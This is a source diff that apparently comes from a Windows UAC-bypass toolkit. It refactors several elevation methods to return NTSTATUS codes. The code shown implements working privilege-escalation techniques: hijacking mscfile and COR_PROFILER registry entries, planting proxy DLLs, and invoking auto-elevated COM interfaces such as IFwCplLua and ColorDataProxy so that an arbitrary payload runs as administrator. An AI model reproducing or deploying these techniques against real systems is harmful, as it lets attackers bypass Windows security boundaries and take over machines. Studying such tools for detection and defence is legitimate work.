 
@@ -2127,7 +2150,7 @@ BOOL ucmSXSDccwMethod(
     if (lpSxsPath) supVirtualFree(lpSxsPath, NULL);
     if (bWusaNeedCleanup) ucmWusaCabinetCleanup();
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -2160,12 +2183,13 @@ BOOL ucmSXSDccwMethodCleanup(
 * http://seclists.org/fulldisclosure/2017/Jul/11
 *
 */
-BOOL ucmCorProfilerMethod(
+NTSTATUS ucmCorProfilerMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL     bCond = FALSE, bResult = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
     SIZE_T   sz = 0;
     GUID     guid;
     HKEY     hKey = NULL;
@@ -2240,9 +2264,10 @@ BOOL ucmCorProfilerMethod(
         //
         // Load target app and trigger cor profiler, eventvwr snap-in is written in the dotnet.
         //
-        bResult = supRunProcess2(MMC_EXE, EVENTVWR_MSC, NULL, SW_SHOW, FALSE);
+        if (supRunProcess2(MMC_EXE, EVENTVWR_MSC, NULL, SW_SHOW, FALSE))
+            MethodResult = STATUS_SUCCESS;
 
-    } while (bCond);
+    } while (FALSE);
 
     //
     // Cleanup.
@@ -2257,7 +2282,7 @@ BOOL ucmCorProfilerMethod(
     if (g_ctx->dwBuildNumber >= 9200)
         supSetEnvVariable(TRUE, NULL, COR_PROFILER_PATH, NULL);
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -2271,25 +2296,27 @@ BOOL ucmCorProfilerMethod(
 * Fixed in Windows 10 RS4.
 *
 */
-BOOL ucmFwCplLuaMethod(
+NTSTATUS ucmFwCplLuaMethod(
     _In_ LPWSTR lpszPayload
 )
 {
-    HANDLE           hProcess = NULL;
-    HRESULT          r = E_FAIL, hr_init;
-    BOOL             bCond = FALSE, bSymLinkCleanup = FALSE;
+    BOOL        bSymLinkCleanup = FALSE;
+    DWORD       dwKeyDisposition = 0;
 
-    PWSTR            pszBuffer = NULL;
+    NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
 
-    LRESULT          lResult;
-    HKEY             hKey = NULL;
-    SIZE_T           sz = 0;
+    HANDLE      hProcess = NULL;
+    HRESULT     r = E_FAIL, hr_init;
 
-    DWORD            dwKeyDisposition = 0;
+    PWSTR       pszBuffer = NULL;
 
-    IFwCplLua       *FwCplLua = NULL;
+    LRESULT     lResult;
+    HKEY        hKey = NULL;
+    SIZE_T      sz = 0;
 
-    WCHAR            szKey[MAX_PATH + 1];
+    IFwCplLua   *FwCplLua = NULL;
+
+    WCHAR       szKey[MAX_PATH + 1];
 
     hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
@@ -2302,8 +2329,10 @@ BOOL ucmFwCplLuaMethod(
         RtlSecureZeroMemory(szKey, sizeof(szKey));
 
         sz = _strlen(lpszPayload);
-        if (sz == 0)
+        if (sz == 0) {
+            MethodResult = STATUS_INVALID_PARAMETER;
             break;
+        }
 
         //
         // Create controlled mscfile entry.
@@ -2422,8 +2451,10 @@ BOOL ucmFwCplLuaMethod(
         // This will trigger our payload as shell will attempt to run it.
         //
         r = FwCplLua->lpVtbl->LaunchAdvancedUI(FwCplLua);
+        if (SUCCEEDED(r))
+            MethodResult = STATUS_SUCCESS;
 
-    } while (bCond);
+    } while (FALSE);
 
     if (hKey != NULL)
         RegCloseKey(hKey);
@@ -2447,7 +2478,7 @@ BOOL ucmFwCplLuaMethod(
     if (dwKeyDisposition == REG_CREATED_NEW_KEY)
         supRegDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSC_SHELL);
 
-    return SUCCEEDED(r);
+    return MethodResult;
 }
 
 /*
@@ -2459,12 +2490,13 @@ BOOL ucmFwCplLuaMethod(
 * This function expects that supMasqueradeProcess was called on process initialization.
 *
 */
-BOOL ucmDccwCOMMethod(
+NTSTATUS ucmDccwCOMMethod(
     _In_ LPWSTR lpszPayload
 )
 {
+    NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
     HRESULT          r = E_FAIL, hr_init;
-    BOOL             bCond = FALSE, bIntApproved1 = FALSE, bIntApproved2 = FALSE;
+    BOOL             bIntApproved1 = FALSE, bIntApproved2 = FALSE;
 
     SIZE_T           sz = 0;
 
@@ -2480,15 +2512,19 @@ BOOL ucmDccwCOMMethod(
         if (supIsConsentApprovedInterface(T_CLSID_ColorDataProxy, &bIntApproved1)) {
             if (supIsConsentApprovedInterface(T_CLSID_CMSTPLUA, &bIntApproved2))
                 if ((bIntApproved1 == FALSE) || (bIntApproved2 == FALSE)) {
-                    if (ucmShowQuestion(UACFIX) != IDYES)
+                    if (ucmShowQuestion(UACFIX) != IDYES) {
+                        MethodResult = STATUS_CANCELLED;
                         break;
+                    }
                 }
         }
 
 
         sz = _strlen(lpszPayload);
-        if (sz == 0)
+        if (sz == 0) {
+            MethodResult = STATUS_INVALID_PARAMETER;
             break;
+        }
 
         //
         // Create elevated COM object for CMLuaUtil.
@@ -2545,6 +2581,9 @@ BOOL ucmDccwCOMMethod(
         //
         r = ColorDataProxy->lpVtbl->LaunchDccw(ColorDataProxy, 0);
 
+        if (SUCCEEDED(r))
+            MethodResult = STATUS_SUCCESS;
+
         Sleep(1000);
 
         //
@@ -2555,7 +2594,7 @@ BOOL ucmDccwCOMMethod(
             T_DISPLAY_CALIBRATION,
             T_CALIBRATOR_VALUE);
 
-    } while (bCond);
+    } while (FALSE);
 
     if (CMLuaUtil != NULL) {
         CMLuaUtil->lpVtbl->Release(CMLuaUtil);
@@ -2568,7 +2607,7 @@ BOOL ucmDccwCOMMethod(
     if (hr_init == S_OK)
         CoUninitialize();
 
-    return SUCCEEDED(r);
+    return MethodResult;
 }
 
 /*
@@ -2581,11 +2620,17 @@ BOOL ucmDccwCOMMethod(
 * Fixed in Windows 10 RS4
 *
 */
-BOOL ucmBitlockerRCMethod(
+NTSTATUS ucmBitlockerRCMethod(
     _In_ LPWSTR lpszPayload
 )
 {
-    BOOL bResult = FALSE, bNeedCleanup = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
+#ifndef _WIN64
+    NTSTATUS Status;
+#endif
+
+    BOOL bNeedCleanup = FALSE;
     HKEY hKey = NULL;
     LRESULT lResult;
     DWORD cbData = 0;
@@ -2595,13 +2640,10 @@ BOOL ucmBitlockerRCMethod(
     SHELLEXECUTEINFO shinfo;
 
 #ifndef _WIN64
-    PVOID   OldValue = NULL;
-#endif
-
-#ifndef _WIN64
     if (g_ctx->IsWow64) {
-        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
-            return FALSE;
+        Status = supEnableDisableWow64Redirection(TRUE);
+        if (!NT_SUCCESS(Status))
+            return Status;
     }
 #endif
 
@@ -2609,7 +2651,7 @@ BOOL ucmBitlockerRCMethod(
     _strcpy(szTargetApp, g_ctx->szSystemDirectory);
     _strcat(szTargetApp, BITLOCKERWIZARDELEV_EXE);
     if (!PathFileExists(szTargetApp))
-        return bResult;
+        return STATUS_OBJECT_NAME_NOT_FOUND;
 #endif
 
     //
@@ -2664,18 +2706,18 @@ BOOL ucmBitlockerRCMethod(
                 RegFlushKey(hKey);
             }
 
-            bResult = TRUE;
+            MethodResult = STATUS_SUCCESS;
         }
         RegCloseKey(hKey);
     }
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
-        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
+        supEnableDisableWow64Redirection(FALSE);
     }
 #endif
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -2690,12 +2732,14 @@ BOOL ucmBitlockerRCMethod(
 * Produced mixed results since Windows 10 RS4.
 *
 */
-BOOL ucmCOMHandlersMethod2(
+NTSTATUS ucmCOMHandlersMethod2(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bCond = FALSE, bResult = FALSE, bNeedCleanup = FALSE, bRemoveFile = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
+    BOOL bNeedCleanup = FALSE, bRemoveFile = FALSE;
 
     DWORD cbData = 0;
     LRESULT lResult;
@@ -2883,9 +2927,10 @@ BOOL ucmCOMHandlersMethod2(
         //
         // Run target.
         //
-        bResult = supRunProcess(MMC_EXE, EVENTVWR_MSC);
+        if (supRunProcess(MMC_EXE, EVENTVWR_MSC))
+            MethodResult = STATUS_SUCCESS;
 
-    } while (bCond);
+    } while (FALSE);
 
     if (SourceKey != NULL) RegCloseKey(SourceKey);
     if (DestKey != NULL) RegCloseKey(DestKey);
@@ -2901,7 +2946,7 @@ BOOL ucmCOMHandlersMethod2(
         DeleteFile(szBuffer);
     }
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -3119,12 +3164,12 @@ DWORD ucmxTrackService()
 * Fixed in Windows 10 RS5.
 *
 */
-BOOL ucmDateTimeStateWriterMethod(
+NTSTATUS ucmDateTimeStateWriterMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL                    bCond = FALSE, bResult = FALSE;
+    NTSTATUS                MethodResult = STATUS_ACCESS_DENIED;
     ULONG                   I, svcstate;
     HRESULT                 hr, hr_init;
     HANDLE                  hSvcStopEvent = NULL;
@@ -3148,7 +3193,7 @@ BOOL ucmDateTimeStateWriterMethod(
         _strcpy(szServiceBinary, g_ctx->szTempDirectory);
         _strcat(szServiceBinary, W32TIME_DLL);
         if (!supWriteBufferToFile(szServiceBinary, ProxyDll, ProxyDllSize))
-            return bResult;
+            return MethodResult;
     }
     else {
 
@@ -3158,14 +3203,14 @@ BOOL ucmDateTimeStateWriterMethod(
             CHIYODA_EXT_ENTRYPOINT,
             TRUE) == FALSE)
         {
-            return bResult;
+            return MethodResult;
         }
 
         _strcpy(szServiceBinary, g_ctx->szTempDirectory);
         _strcat(szServiceBinary, MYSTERIOUSCUTETHING);
         _strcat(szServiceBinary, L".exe");
         if (!supWriteBufferToFile(szServiceBinary, ProxyDll, ProxyDllSize))
-            return bResult;
+            return MethodResult;
     }
 
     hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
@@ -3257,6 +3302,8 @@ BOOL ucmDateTimeStateWriterMethod(
             break;
         }
 
+        MethodResult = STATUS_SUCCESS;
+
         //
         // Wait some time for ping back.
         // We can't exit without ping back because:
@@ -3268,7 +3315,7 @@ BOOL ucmDateTimeStateWriterMethod(
         NtWaitForSingleObject(hSvcStopEvent, FALSE, &liDueTime);
         supDbgMsg(L"app>>wait complete\r\n");
 
-    } while (bCond);
+    } while (FALSE);
 
     if (hSvcStopEvent)
         NtClose(hSvcStopEvent);
@@ -3284,7 +3331,7 @@ BOOL ucmDateTimeStateWriterMethod(
 
     DeleteFile(szServiceBinary);
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -3297,10 +3344,12 @@ BOOL ucmDateTimeStateWriterMethod(
 * Fixed in Windows 10 RS4
 *
 */
-BOOL ucmAcCplAdminMethod(
+NTSTATUS ucmAcCplAdminMethod(
     _In_ LPWSTR lpszPayload
 )
 {
+    NTSTATUS                MethodResult = STATUS_ACCESS_DENIED;
+
     BOOL                    bValueSet = FALSE;
     IAccessibilityCplAdmin *AdminElevate = NULL;
     HRESULT                 hr = E_FAIL, hr_init;
@@ -3347,6 +3396,8 @@ BOOL ucmAcCplAdminMethod(
                 bValueSet = TRUE;
 
                 hr = AdminElevate->lpVtbl->LinktoSystemRestorePoint(AdminElevate);
+                if (SUCCEEDED(hr))
+                    MethodResult = STATUS_SUCCESS;
             }
             else {
                 RegCloseKey(hKey);
@@ -3372,7 +3423,7 @@ BOOL ucmAcCplAdminMethod(
     if (hr_init == S_OK)
         CoUninitialize();
 
-    return SUCCEEDED(hr);
+    return MethodResult;
 }
 
 /*
@@ -3389,12 +3440,12 @@ BOOL ucmAcCplAdminMethod(
 * However you can extent it to force drop your *32* bit dll from your *64* bit application.
 *
 */
-BOOL ucmEgre55Method(
+NTSTATUS ucmEgre55Method(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     PWSTR pTmp = NULL, lpDest = NULL;
 
     SIZE_T Length;
@@ -3424,7 +3475,8 @@ BOOL ucmEgre55Method(
 
         _strcpy(szBuffer, g_ctx->szSystemDirectory);
         _strcat(szBuffer, SYSTEMROPERTIESADVANCED_EXE);
-        bResult = supRunProcess(szBuffer, NULL);
+        if (supRunProcess(szBuffer, NULL))
+            MethodResult = STATUS_SUCCESS;
 
         DeleteFile(lpDest);
 
@@ -3433,5 +3485,5 @@ BOOL ucmEgre55Method(
     if (pTmp) CoTaskMemFree((LPVOID)pTmp);
     if (lpDest) supHeapFree(lpDest);
 
-    return bResult;
+    return MethodResult;
 }
